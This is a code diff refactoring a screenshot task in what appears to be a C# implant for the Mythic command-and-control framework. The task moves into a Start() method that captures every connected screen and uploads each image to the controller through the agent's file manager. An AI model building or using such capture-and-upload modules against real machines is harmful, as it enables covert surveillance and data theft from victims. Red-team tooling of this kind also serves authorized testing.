@@ -25,45 +25,41 @@ namespace Tasks
         {
         }
 
-        public override void Kill()
-        {
-            base.Kill();
-        }
 
-        public override ST.Task CreateTasking()
+        public override void Start()
         {
-            return new ST.Task(() =>
+            TaskResponse resp = CreateTaskResponse("", true);
+            List<byte[]> captures = new List<byte[]>();
+            foreach (Screen sc in Screen.AllScreens)
             {
-                TaskResponse resp = CreateTaskResponse("", true);
-                List<byte[]> captures = new List<byte[]>();
-                foreach(Screen sc in Screen.AllScreens)
-                {
-                    byte[] bScreen = GetBytesFromScreen(sc);
-                    captures.Add(bScreen);
-                }
-                foreach(byte[] bScreen in captures)
-                {
-                    if (!_agent.GetFileManager().PutFile(
+                byte[] bScreen = GetBytesFromScreen(sc);
+                captures.Add(bScreen);
+            }
+
+            foreach (byte[] bScreen in captures)
+            {
+                if (!_agent.GetFileManager().PutFile(
                         _cancellationToken.Token,
                         _data.ID,
                         bScreen,
                         null,
                         out string mythicFileId,
                         true))
-                    {
-                        resp = CreateTaskResponse("", true, "error");
-                        break;
-                    } else
-                    {
-                        _agent.GetTaskManager().AddTaskResponseToQueue(CreateTaskResponse(
-                            mythicFileId, false, ""));
-                    }
+                {
+                    resp = CreateTaskResponse("", true, "error");
+                    break;
                 }
-                _agent.GetTaskManager().AddTaskResponseToQueue(resp);
-                // Your code here..
-                // Then add response to queue
-                // _agent.GetTaskManager().AddTaskResponseToQueue(resp);
-            }, _cancellationToken.Token);
+                else
+                {
+                    _agent.GetTaskManager().AddTaskResponseToQueue(CreateTaskResponse(
+                        mythicFileId, false, ""));
+                }
+            }
+
+            _agent.GetTaskManager().AddTaskResponseToQueue(resp);
+            // Your code here..
+            // Then add response to queue
+            // _agent.GetTaskManager().AddTaskResponseToQueue(resp);
         }
 
         private byte[] GetBytesFromScreen(Screen screen)
